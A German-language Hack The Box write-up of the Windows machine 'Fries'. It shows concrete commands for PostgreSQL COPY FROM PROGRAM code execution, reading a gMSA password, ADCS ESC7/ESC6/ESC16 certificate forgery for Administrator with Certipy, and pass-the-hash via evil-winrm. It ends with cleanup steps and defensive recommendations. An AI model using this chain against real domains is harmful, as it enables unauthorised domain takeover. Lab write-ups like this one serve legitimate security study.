# Hack The Box: Fries Writeup

> Öffentliches Writeup für GitHub. Flags, private Schlüssel, PFX-Dateien, wiederverwendbare Hashes und vollständige Secrets sind absichtlich nicht enthalten.

## Überblick

Fries ist eine harte Windows/Active-Directory-Maschine. Obwohl die bereitgestellten Start-Credentials nicht direkt für SMB, LDAP oder WinRM funktionierten, waren sie für interne Web-Anwendungen nutzbar. Die eigentliche Kette führte über VHost-Recon zu Gitea und pgAdmin, über Git-History zu PostgreSQL-Zugang, über PostgreSQL zu einem Linux-Foothold, anschließend über `svc_infra` zu einem gMSA-Account und schließlich über ADCS ESC7/ESC6/ESC16 zu Administrator.

High-Level Kill Chain:

```text
Start-Creds
  -> VHosts / Gitea / pgAdmin
  -> Git-History mit DB-Konfiguration
  -> PostgreSQL Superuser über pgAdmin
  -> COPY FROM PROGRAM / Credential Recovery
  -> SSH als svc / svc_infra
  -> gMSA_CA_prod$ Managed Password
  -> ADCS ESC7 -> ESC6/ESC16
  -> Administrator-Zertifikat
  -> Administrator NTLM / Evil-WinRM
```

## Recon

Initiale Checks:

```bash
nmap -Pn -sC -sV -oN nmap.txt 10.129.244.72
nmap -Pn -p- --min-rate 5000 -oN nmap-allports.txt 10.129.244.72
```

Interessante Oberfläche:

- Windows Domain Controller / AD-Dienste
- HTTP/HTTPS mit mehreren Virtual Hosts
- WinRM
- SMB
- LDAP/LDAPS

Die wichtigsten VHosts waren:

```text
fries.htb
code.fries.htb
pwm.fries.htb
db-mgmt05.fries.htb
dc01.fries.htb
```

VHost-Fuzzing war entscheidend, weil die Hauptseite alleine nicht zur Lösung führte.

## Start-Credentials

Die Box stellt einen Domänenbenutzer als Startpunkt bereit. Direkte Tests gegen klassische AD-Protokolle waren zunächst nicht erfolgreich:

```bash
ldapsearch ...
smbclient -L //10.129.244.72 ...
evil-winrm -i 10.129.244.72 ...
```

Der wichtige Punkt: Die Credentials funktionierten trotzdem auf Web-Anwendungen. Deshalb lohnt es sich, Start-Credentials immer auch gegen gefundene VHosts und interne Portale zu testen.

## Gitea: Git-History als Pivot

Auf `code.fries.htb` lief Gitea. Mit den Start-Credentials war ein Login möglich und ein Repository konnte geklont werden.

```bash
git clone http://<user>:<password>@code.fries.htb/<repo>.git gitea-fries
```

Danach war nicht nur der aktuelle Stand interessant, sondern die komplette Historie:

```bash
git log --oneline --all --decorate --stat

for c in $(git rev-list --all); do
  git grep -nE 'DATABASE|SECRET|PASS|password|postgres|credential|token|key|\.env' "$c" || true
done
```

In einem alten Commit lag eine entfernte `.env` mit PostgreSQL-Verbindungsinformationen. Die Werte sind hier absichtlich nicht veröffentlicht. Der Fund zeigte aber, dass `db-mgmt05.fries.htb` der nächste wichtige Pivot war.

## pgAdmin und PostgreSQL

Auf `db-mgmt05.fries.htb` lief pgAdmin. Die Start-Credentials funktionierten auch dort. Über die pgAdmin-Session ließ sich eine gespeicherte PostgreSQL-Verbindung nutzen.

Nützliche SQL-Checks:

```sql
SELECT current_user, current_database(), version();
SELECT rolsuper FROM pg_roles WHERE rolname = current_user;
```

Da der Kontext ausreichend privilegiert war, funktionierte PostgreSQL Command Execution über `COPY FROM PROGRAM`:

```sql
DROP TABLE IF EXISTS cmdout;
CREATE TABLE cmdout(t text);
COPY cmdout FROM PROGRAM 'id; hostname; pwd';
SELECT * FROM cmdout;
```

Damit war ein Weg zur Enumeration innerhalb der Linux-/Container-Komponente offen. Über die weitere Enumeration wurden Credentials für Linux-Zugriff gewonnen.

## SSH-Foothold

Die aus der Web-/DB-Kette gewonnenen Credentials wurden gegen mehrere Dienste getestet. Ein wichtiger Schritt war SSH-Zugriff auf den Web-Host.

```bash
ssh <user>@10.129.244.72
```

Danach wurde weiter auf `svc_infra` pivotiert. Von dort aus wurde Active Directory interessant, weil dieser Account Zugriff auf ein gMSA-Secret hatte.

## gMSA Enumeration

Mit `svc_infra` ließ sich das Managed Password eines gMSA-Kontos lesen. Dafür wurde BloodyAD verwendet:

```bash
bloodyAD --host 10.129.244.72 \
  -d fries.htb \
  -u svc_infra \
  -p '<password>' \
  get object 'GMSA_CA_PROD$' \
  --attr msDS-ManagedPassword
```

Aus dem Managed Password wurde der NTLM-Hash des gMSA-Kontos abgeleitet. Der Hash wird hier nicht veröffentlicht. Mit diesem Konto war WinRM möglich:

```bash
evil-winrm -i 10.129.244.72 \
  -u 'gMSA_CA_prod$' \
  -H '<gmsa-ntlm-hash>'
```

## ADCS Enumeration

Mit dem gMSA-Kontext wurde ADCS geprüft:

```bash
certipy find \
  -u 'gMSA_CA_prod$@fries.htb' \
  -hashes ':<gmsa-ntlm-hash>' \
  -dc-ip 10.129.244.72 \
  -target dc01.fries.htb \
  -vulnerable -stdout
```

Relevant waren gefährliche CA-Rechte und eine Eskalationskette über ADCS:

- ESC7: gMSA hatte gefährliche CA-Rechte
- ESC6: Enrollees konnten SAN angeben, nachdem die CA-Konfiguration angepasst wurde
- ESC16: Security Extension konnte temporär deaktiviert werden

Vor Änderungen wurden die Originalwerte notiert. Die CA wurde später wieder zurückgesetzt.

## ESC7 zu Administrator

Über WinRM als gMSA wurde das PSPKI-Modul auf dem Ziel genutzt, um CA-Konfiguration zu prüfen und temporär anzupassen.

Beispiel zur Prüfung:

```powershell
Import-Module PSPKI
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
$configReader.SetRootNode($true)
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
$configReader.GetConfigEntry("DisableExtensionList", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

Nach Aktivierung der notwendigen Bedingungen wurde mit Certipy 5 ein Zertifikat für Administrator angefordert. Certipy 5 war wichtig, weil die SID-Erweiterung korrekt gesetzt werden musste.

```bash
python3.13 -m venv certipy5-venv
./certipy5-venv/bin/pip install 'certipy-ad>=5.0.3'

./certipy5-venv/bin/certipy req \
  -u 'svc_infra@fries.htb' \
  -p '<password>' \
  -dc-ip 10.129.244.72 \
  -target dc01.fries.htb \
  -ca 'fries-DC01-CA' \
  -template 'User' \
  -upn 'administrator@fries.htb' \
  -sid '<administrator-sid>' \
  -out administrator
```

Beim Authentifizieren trat Kerberos Clock Skew auf. Die DC-Zeit lag gegenüber der lokalen Zeit versetzt, deshalb wurde `faketime` verwendet:

```bash
faketime -f '+7h' ./certipy5-venv/bin/certipy auth \
  -pfx administrator.pfx \
  -dc-ip 10.129.244.72 \
  -username Administrator \
  -domain fries.htb
```

Certipy lieferte anschließend den Administrator-Hash. Der Hash ist im öffentlichen Writeup redaktiert.

## Administrator und Flags

Mit dem Administrator-Hash war Pass-the-Hash über WinRM möglich:

```bash
evil-winrm -i 10.129.244.72 \
  -u Administrator \
  -H '<administrator-ntlm-hash>'
```

Die Flags lagen auf dem Administrator-Desktop und wurden lokal verifiziert:

```powershell
Get-Content C:\Users\Administrator\Desktop\user.txt
Get-Content C:\Users\Administrator\Desktop\root.txt
```

Die Flag-Werte werden im öffentlichen Writeup nicht veröffentlicht.

## Cleanup

Da die ADCS-Konfiguration verändert wurde, war Cleanup wichtig:

- `EditFlags` auf den ursprünglichen Wert zurückgesetzt
- `DisableExtensionList` geleert
- CA-Service neu gestartet bzw. Start geprüft
- CA-Ping verifiziert
- temporär aktiviertes `SubCA`-Template wieder deaktiviert

Prüfung:

```powershell
Get-CertificationAuthority | Select DisplayName,IsAccessible,ServiceStatus
certutil -config DC01.fries.htb\fries-DC01-CA -ping
```

## Takeaways

- Start-Credentials immer auch gegen Web-Apps testen, nicht nur gegen SMB/LDAP/WinRM.
- VHost-Recon ist bei Windows-Boxes mit internen Apps oft der Schlüssel.
- Git-History kann entfernte `.env`-Dateien und DB-URLs enthalten.
- pgAdmin plus PostgreSQL-Superuser kann direkt zu `COPY FROM PROGRAM` RCE führen.
- gMSA-Leserechte sind ein starker AD-Eskalationsindikator.
- ADCS sollte früh geprüft werden, sobald ein brauchbarer AD-Kontext vorhanden ist.
- Für moderne SID-basierte ADCS-Ketten Certipy 5 nutzen.
- Bei PKINIT-Fehlern immer Kerberos-Zeitversatz prüfen.
- CA-Änderungen nach dem Exploit sauber zurücksetzen.

## Empfehlungen

Defensive Maßnahmen, die diese Kette unterbrechen würden:

- Start-Credentials nicht für mehrere interne Systeme wiederverwenden.
- Secrets aus Git-History entfernen und Repositories bereinigen.
- pgAdmin nicht mit dauerhaft gespeicherten Superuser-Verbindungen betreiben.
- PostgreSQL-Superuser-Rechte minimieren.
- gMSA `msDS-ManagedPassword`-Leserechte streng begrenzen.
- ADCS regelmäßig mit Certipy/PSPKIAudit prüfen.
- ManageCA/ManageCertificates nur sehr restriktiv vergeben.
- CA-Konfigurationsänderungen überwachen, insbesondere `EditFlags` und `DisableExtensionList`.
